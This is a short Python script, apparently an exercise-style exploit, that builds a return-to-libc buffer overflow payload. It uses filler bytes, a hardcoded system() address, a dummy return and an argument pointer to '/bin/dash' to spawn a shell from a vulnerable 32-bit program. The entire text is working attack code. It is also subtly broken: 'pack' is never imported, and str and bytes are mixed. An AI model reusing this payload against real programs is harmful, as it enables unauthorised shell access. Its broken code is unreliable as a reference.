import sys
filler = "D"*22
ret = pack("<I", 0x0804ef50) #start of system
dummy_ret = "f"*4
arg = pack("<I", 0xbffefaa8) #wherever shell code string is
command = b"/bin/dash"
sys.stdout.buffer.write(filler + ret + dummy_ret + arg + command)